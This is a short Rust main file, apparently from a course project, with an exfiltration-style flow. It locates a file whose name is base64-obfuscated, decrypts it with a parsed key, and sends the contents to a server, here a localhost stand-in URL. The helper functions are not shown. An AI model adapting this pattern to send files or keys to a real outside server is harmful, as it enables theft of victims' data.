use P3::*;
#[tokio::main]

async fn main() {
    let file_path = "c2VjcmV0X2ZpbGUudHh0.encr";
    let server_url = "https://127.0.0.1";
    let github_link = "https://github.com/lyssairene/Project3";

    if let Ok(data) = scan_system(file_path).await {
        let secret_key = parse_secret().await.unwrap();
        let decrypted_data = decrypt_file(&data, &secret_key);
        if let Err(e) = send_contents(decrypted_data.await, server_url, &secret_key, github_link).await {
            eprintln!("Error: {}", e);
        }
    } else {
        eprintln!("Failed to read file.");
    }
}